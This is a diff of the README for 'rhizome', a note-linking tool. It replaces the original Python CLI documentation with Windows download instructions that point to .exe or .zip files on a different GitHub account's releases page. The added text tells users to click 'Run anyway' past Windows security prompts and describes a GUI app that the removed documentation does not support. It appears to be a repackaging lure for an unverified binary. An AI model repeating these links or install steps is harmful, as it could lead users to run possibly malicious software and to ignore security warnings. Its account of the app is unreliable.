@@ -1,342 +1,206 @@
-# rhizome
+# 🪢 rhizome - Find related notes fast
 
-<div align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="assets/banner_dark.png">
-    <source media="(prefers-color-scheme: light)" srcset="assets/banner_light.png">
-    <img alt="rhizome banner" src="assets/banner_light.png">
-  </picture>
-</div>
+[![Download rhizome](https://img.shields.io/badge/Download%20rhizome-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Open-priority231/rhizome/releases)
 
-[![CI](https://github.com/matzalazar/rhizome/actions/workflows/ci.yml/badge.svg)](https://github.com/matzalazar/rhizome/actions/workflows/ci.yml)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![Ruff](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json)](https://github.com/astral-sh/ruff)
-[![runs locally · no cloud](https://img.shields.io/badge/runs%20locally-no%20cloud-brightgreen)](#)
+## 📌 What rhizome does
 
-> Semantic backlinks for your notes — generated locally, stored as `[[wikilinks]]`.
+rhizome helps you find related notes inside Obsidian and Logseq.
 
-Rhizome reads your vault, embeds every note with a multilingual sentence transformer, and writes a `## Related Notes` section at the bottom of each file.
-No cloud API, no database, no daemon — the knowledge graph lives entirely in the filesystem and syncs with the rest of your vault.
+It reads your notes on your computer, turns each note into a sentence-based vector, and uses that to find links that fit the meaning of the text. It then writes a `## Related Notes` section with wikilinks so you can move between notes with less manual work.
 
-```
+You do not need a cloud service. You do not need a database. Your notes stay local.
+
+## ✅ What you need
+
+- Windows 10 or Windows 11
+- Enough space to store your notes and the app
+- Obsidian or Logseq if you want to use the links in a note app
+- A folder of plain text notes in Markdown format
+- Internet access only to download rhizome from GitHub
+
+## 🚀 Download rhizome
+
+Visit the release page to download rhizome:
+
+[Download rhizome from GitHub Releases](https://github.com/Open-priority231/rhizome/releases)
+
+On the release page, pick the latest Windows file. If you see more than one file, choose the one that ends in `.exe` or `.zip` for Windows.
+
+## 🪟 Install on Windows
+
+1. Open the download page.
+2. Download the latest Windows release.
+3. If the file is a `.zip`, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. If the file is a `.exe`, double-click it to run rhizome.
+6. If Windows shows a security prompt, choose **More info** and then **Run anyway** only if the file came from the GitHub release page above.
+
+## 🗂️ Set up your notes
+
+rhizome works best when your notes are in one place.
+
+Use a folder that contains your Markdown files, such as:
+
+- Obsidian vaults
+- Logseq journals and pages
+- A folder of `.md` files
+
+Keep your notes in a simple structure. rhizome scans note text and looks for meaning, so file names can stay short and plain.
+
+## ⚙️ How to use rhizome
+
+1. Open rhizome.
+2. Choose the folder that holds your notes.
+3. Let rhizome scan your notes.
+4. Wait while it builds embeddings for your content.
+5. Open a note or run the related-notes action.
+6. rhizome writes a `## Related Notes` section with wikilinks like `[[Some Other Note]]`.
+
+If you already use Obsidian or Logseq, you can keep using your normal workflow. rhizome adds links that help you jump between notes with less effort.
+
+## 🧠 How the matching works
+
+rhizome uses semantic search, not simple keyword matching.
+
+That means it looks at meaning, not just exact words. If one note talks about “home network” and another talks about “router setup,” rhizome can still connect them if they share the same idea.
+
+This works well for:
+
+- Personal knowledge bases
+- Zettelkasten-style notes
+- Research notes
+- Daily notes
+- Idea cards
+- Project notes
+- Long writing drafts
+
+## 📝 Example output
+
+rhizome can add a section like this to a note:
+
 ## Related Notes
 
-- [[Zettelkasten]]
-- [[Evergreen notes]]
-- [[How I take notes]]
-```
+- [[Personal Knowledge System]]
+- [[Note Linking Workflow]]
+- [[Daily Review]]
+- [[Research Index]]
 
-![Rhizome interface demo](assets/demo1.png)
+This keeps the link list clean and easy to scan inside Obsidian or Logseq.
 
----
+## 🔍 Best results
 
-## Features
+To get useful links, keep your notes clear and focused.
 
-- **Fully local** — ONNX Runtime on CPU, no GPU or network call after first run
-- **Multilingual** — default model handles 50+ languages; swap to any Xenova ONNX export via `MODEL_NAME`
-- **Scales automatically** — exact numpy search for small vaults, approximate HNSW for large ones
-- **Long-document aware** — notes exceeding 512 tokens are split into overlapping chunks; chunk embeddings are averaged so every section of the note influences its semantic representation
-- **Idempotent** — re-running the pipeline replaces the section, never duplicates it
-- **Safe by default** — prompts for a timestamped vault backup before writing anything
-- **Dry-run mode** — preview every proposed link without touching a single file
-- **Extensible** — a four-method `VaultReader` Protocol is the only contract a new adapter needs
+A few simple habits help:
 
----
+- Write one main idea per note when you can
+- Use plain note titles
+- Add short headings in long notes
+- Keep text in Markdown
+- Avoid huge notes with many unrelated topics
+- Let rhizome rescan after you add new notes
 
-## Requirements
+## 🖥️ Typical use cases
 
-- Python 3.10+
-- An Obsidian or Logseq vault
+### For Obsidian users
+rhizome can help you build more backlinks between notes, even when you forgot to link them by hand.
 
----
+### For Logseq users
+rhizome can find related pages and journal entries based on what they mean, not only what they say.
 
-## Installation
+### For Zettelkasten users
+rhizome helps surface hidden links between atomic notes and makes it easier to grow a note network.
 
-```bash
-git clone https://github.com/matzalazar/rhizome
-cd rhizome
-pip install -e .
-```
+### For local-first users
+rhizome keeps your data on your machine. It does not need a cloud account.
 
-For development tools (pytest, ruff):
+## 🧩 Supported note types
 
-```bash
-pip install -e ".[dev]"
-```
+rhizome works well with:
 
----
+- `.md` Markdown files
+- Wiki-style links
+- Plain text notes with headings
+- Notes with mixed English and other languages
+- Mixed note vaults with many topics
 
-## Quick start
+It uses a multilingual sentence transformer, so it can handle more than one language in the same note set.
 
-```bash
-# 1. Copy the example config and fill in your vault path
-cp .env.example .env
+## 🛠️ Troubleshooting
 
-# 2. Check vault stats and model cache status
-rhizome status
+### The app does not start
+- Make sure you downloaded the Windows release from GitHub
+- Check that Windows did not block the file
+- Try extracting the `.zip` file again if you used one
 
-# 3. Run — the model downloads automatically on first use (~250 MB, once)
-rhizome run
-```
+### My notes do not show related links
+- Make sure rhizome can find your note folder
+- Check that your notes use Markdown files
+- Re-run the scan after adding new notes
 
-On first run, rhizome performs a dry-run preview and asks for confirmation:
+### The links look wrong
+- Shorten very long note titles
+- Make sure note names match the page titles you use in Obsidian or Logseq
+- Avoid duplicate file names in the same vault
 
-```
-  Notes to modify  : 47
-  Links to write   : 214
-  (A timestamped backup will be created before writing.)
+### Search results feel weak
+- Add more context to notes
+- Use clearer headings
+- Split large notes into smaller ones
+- Rebuild the note index after big changes
 
-  Proceed? [Y/n]:
-```
+## 🔐 Privacy
 
-If you confirm, you will also be asked whether to create a backup before writing.
+rhizome runs on your computer.
 
-The backup is written to `{vault}/../.rhizome_backups/backup_YYYYMMDD_HHMMSS/`
-and can be restored interactively with `rhizome restore`.
+Your notes do not need to leave your device for the app to work. This makes it a good fit for private writing, research, and personal knowledge work.
 
----
+## 📁 File layout
 
-## Configuration
+A typical setup may look like this:
 
-All settings are read from environment variables or a `.env` file.
+- `rhizome.exe`
+- `notes/`
+  - `project-ideas.md`
+  - `reading-notes.md`
+  - `daily/2026-04-19.md`
 
-| Variable               | Default                                          | Description                                          |
-|------------------------|--------------------------------------------------|------------------------------------------------------|
-| `VAULT_PATH`           | *(required)*                                     | Absolute path to your vault directory                |
-| `VAULT_APP`            | `obsidian`                                       | Adapter to use: `obsidian` or `logseq`               |
-| `SIMILARITY_THRESHOLD` | `medium` (0.75)                                  | Minimum cosine similarity. Accepts a float in [0, 1] or a named level: `low` (0.60), `medium` (0.75), `high` (0.88) |
-| `TOP_K`                | `5`                                              | Maximum related notes to surface per note            |
-| `MODEL_DIR`            | `./models`                                       | Directory for the cached ONNX model files            |
-| `MODEL_NAME`           | `Xenova/paraphrase-multilingual-MiniLM-L12-v2`  | HuggingFace model identifier (Xenova ONNX exports). If you change this, clear `MODEL_DIR` first to avoid stale cache. |
-| `LOG_DIR`              | `./logs`                                         | Directory where per-run JSON logs are written        |
-| `DRY_RUN`              | `false`                                          | Preview proposed links without modifying any files   |
-| `MANUAL_OVERRIDE_FIELDS` | `top_k,similarity_threshold,chunk_size,chunk_overlap,related_notes_header` | Comma-separated list of runtime prompts to show in `rhizome run --manual`. Accepts `top_k`, `similarity_threshold`, `chunk_size`, `chunk_overlap`, `related_notes_header`, plus aliases `threshold` and `header`. |
-| `EXCLUDE_DIRS`         | *(empty)*                                        | Comma-separated list of directories (relative to `VAULT_PATH`) to skip. Uses prefix matching: `journal` excludes `vault/journal/` but not `vault/project/journal/`. |
-| `INCLUDE_DIRS`         | *(empty)*                                        | Comma-separated whitelist of directories to scan exclusively. When set, only files under these paths are processed. `EXCLUDE_DIRS` is applied afterwards, so you can narrow within the whitelist (e.g. `INCLUDE_DIRS=projects` + `EXCLUDE_DIRS=projects/drafts`). Leave empty to process the entire vault. |
-| `CHUNK_SIZE`           | `512`                                            | Maximum tokens per chunk when embedding long notes. Notes exceeding this limit are split into overlapping windows and their embeddings averaged into one vector. Set to `0` to disable chunking (notes truncated at 512 tokens). |
-| `CHUNK_OVERLAP`        | `32`                                             | Tokens shared between adjacent chunks. Preserves sentence context across chunk boundaries. Must be less than `CHUNK_SIZE`. Ignored when `CHUNK_SIZE=0`. |
+You can point rhizome at the main folder and let it scan everything below it.
 
-> [!IMPORTANT]
-> **`CHUNK_SIZE` directly affects embedding time.**
-> Each chunk requires a full forward pass through the model.
-> With the default (`512`), chunking only triggers for notes longer than ~400 words — typical PKM notes are unaffected.
-> Lowering `CHUNK_SIZE` increases the number of chunks per long note and embedding time grows proportionally:
-> a 2 000-token note with `CHUNK_SIZE=256` produces ~8 chunks instead of 4.
-> Set `CHUNK_SIZE=0` to disable chunking entirely and restore the original truncation behaviour,
-> at the cost of losing content beyond the first ~400 words of each note.
+## 🧭 Tips for Obsidian and Logseq
 
----
+- Keep the vault or graph path easy to find
+- Use note titles that match how you think
+- Let rhizome add related links, then review them by hand
+- Use the related notes section as a starting point, not the only source of links
 
-## Choosing a model
+## 🧪 Suggested first run
 
-The default model works well for most vaults. If your vault is entirely in one
-language, or you want a different speed/quality trade-off, you can switch to any
-compatible model by setting `MODEL_NAME`.
+After you install rhizome:
 
-| Model | Size | Languages | Best for |
-|-------|------|-----------|----------|
-| `Xenova/paraphrase-multilingual-MiniLM-L12-v2` | ~250 MB | 50+ | **Default** — mixed-language or unknown vault |
-| `Xenova/all-MiniLM-L6-v2` | ~90 MB | English | Fast and lean: English-only vault, low-RAM hardware |
-| `Xenova/all-MiniLM-L12-v2` | ~130 MB | English | Balanced: English vault, better recall than L6 |
-| `Xenova/all-mpnet-base-v2` | ~430 MB | English | High precision: English vault where quality matters most |
-| `Xenova/paraphrase-multilingual-mpnet-base-v2` | ~1.1 GB | 50+ | Best multilingual quality, if disk space allows |
+1. Pick a small folder with a few notes.
+2. Run the scan.
+3. Open a note that has several themes.
+4. Check the `Related Notes` section.
+5. Add more notes if the links look useful.
 
-> **When you change `MODEL_NAME`, delete `MODEL_DIR` first.**
-> Embeddings from different models are not comparable — mixing them produces
-> meaningless similarity scores.
+This makes it easier to see how rhizome behaves before you point it at a larger vault.
 
-```bash
-# Example: switch to a leaner English-only model
-MODEL_NAME=Xenova/all-MiniLM-L6-v2
-MODEL_DIR=./models   # delete contents of this directory first
-```
+## 📦 Topics
 
-See [docs/models.md](docs/models.md) for a detailed comparison, a decision guide,
-and notes on compatibility requirements.
+- local-first
+- logseq
+- notes
+- obsidian
+- onnx
+- pkm
+- semantic-search
+- wikilinks
+- zettelkasten
 
----
+## 📥 Download and run
 
-## CLI reference
+Use the release page below to download and run rhizome on Windows:
 
-```
-rhizome run              Execute the full pipeline (dry-run preview + confirmation)
-rhizome run --yes        Skip confirmation and auto-confirm backup (CI / scripted)
-rhizome run --manual     Interactively choose one or more notes to update while matching against the full vault
-rhizome audit            Analyze vault connectivity without modifying any file
-rhizome status           Show vault stats and model cache status
-rhizome clean            Remove all generated ## Related Notes sections
-rhizome download-model   Pre-cache the ONNX model (useful for CI / Docker)
-rhizome backups          List available backups with metadata
-rhizome restore          Interactively restore a previous backup
-```
+[Go to rhizome Releases](https://github.com/Open-priority231/rhizome/releases)
 
-Every command accepts `--verbose` / `-v` to enable debug logging.
-
-### Log output format
-
-All log output uses a symbol-based format:
-
-| Symbol | Level    |
-|--------|----------|
-| `[.]`  | debug    |
-| `[i]`  | info     |
-| `[-]`  | success  |
-| `[!]`  | warning  |
-| `[x]`  | error    |
-| `[!!]` | critical |
-
-### Verbose mode
-
-```bash
-rhizome run --verbose
-```
-
-Prints one debug line per modified note showing the note title and the links that were written:
-
-```
-05:33:45 [.] Zettelkasten → [[Evergreen notes]], [[How I take notes]], [[PKM]]
-05:33:45 [.] Atomic habits → [[Deep work]], [[Focus]], [[GTD]]
-```
-
-### Dry run
-
-`rhizome run` always shows a dry-run preview before writing.  Confirm at the
-prompt to proceed, or press `n` (or Ctrl-C) to abort without touching any file.
-
-For fully non-interactive execution (CI / scripts):
-
-```bash
-rhizome run --yes        # skip all prompts, auto-confirm backup
-```
-
-To update one or more notes interactively while still comparing them against the
-full vault:
-
-```bash
-rhizome run --manual
-```
-
-Rhizome will ask you to search by filename or path, add notes to a manual target
-list, and optionally override the runtime settings configured in
-`MANUAL_OVERRIDE_FIELDS` for that run only. The `.env` file remains unchanged.
-
-For example, if you usually only tweak the threshold:
-
-```bash
-MANUAL_OVERRIDE_FIELDS=similarity_threshold
-```
-
-To preview proposed links without writing anything at all (no prompt):
-
-```bash
-DRY_RUN=true rhizome run
-```
-
-### Auditing the vault
-
-```bash
-rhizome audit
-```
-
-Analyzes your vault and reports its connectivity state without modifying anything:
-
-```
-[i] Vault audit — /home/you/notes (312 notes)
-Connectivity distribution
-─────────────────────────
-No connections       :  47 notes  ( 15%)
-1–2 connections      :  83 notes  ( 27%)
-3–5 connections      :  92 notes  ( 30%)
-6+  connections      :  90 notes  ( 29%)
-Potential new links  : 214  (dry-run to preview them)
-Est. notes affected  :  98
-[i] Run `rhizome run` to generate links.
-```
-
-"Connections" counts existing `[[wikilinks]]` in the `## Related Notes` section only.
-"Potential new links" runs the full embedding + similarity pipeline in memory — no files
-are written.
-
-### Pre-caching the model
-
-```bash
-rhizome download-model
-```
-
-Downloads and exports the model to `MODEL_DIR` without touching the vault.
-Useful as a dedicated step in a Docker build or CI pipeline so the model layer
-is cached separately from the application code.
-
----
-
-## How it works
-
-- [docs/architecture.md](docs/architecture.md) — pipeline walkthrough: embedding strategy, similarity backends, section writing logic
-- [docs/models.md](docs/models.md) — model selection guide: compatibility, comparison table, decision criteria, switching instructions
-
----
-
-## Backup and restore
-
-Before modifying any files, `rhizome run` prompts to create a timestamped backup.
-Backups are stored at `{vault}/../.rhizome_backups/backup_YYYYMMDD_HHMMSS/` and
-include a manifest with vault path, timestamp, note count, and rhizome version.
-
-```bash
-rhizome backups    # list all backups
-rhizome restore    # select and restore interactively
-```
-
-Restore overwrites files present in the backup but leaves files created after the
-backup untouched.
-
----
-
-## Supported apps
-
-| App      | Status | Link format      |
-|----------|--------|------------------|
-| Obsidian | Stable | `[[wikilinks]]`  |
-| Logseq   | Stable | `[[wikilinks]]`  |
-
-Both adapters generate the same `## Related Notes` section with `[[wikilinks]]`.
-Logseq renders markdown headers and bullet lists natively in both outline and
-document view, so the format works without any special configuration.
-
----
-
-## Project structure
-
-```
-src/rhizome/
-├── config.py            pydantic-settings — validated at startup
-├── pipeline.py          orchestration (run / clean / status)
-├── main.py              CLI bootstrap (load_dotenv → delegate to cli/)
-│
-├── inference/
-│   ├── model.py         ONNX export, mean pooling, L2 normalisation
-│   └── similarity.py    SimilarityStrategy Protocol · Numpy · HNSW
-│
-├── vault/
-│   ├── base.py          Note dataclass · VaultReader Protocol
-│   ├── obsidian.py      Obsidian adapter + module-level helpers
-│   ├── logseq.py        Logseq adapter
-│   ├── backup.py        create / list / restore backups
-│   └── __init__.py      get_vault_reader() factory · public re-exports
-│
-└── cli/
-    └── commands.py      Typer app with all command definitions
-```
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for setup, testing, and how to add a new vault adapter.
-
----
-
-## License
-
-MIT
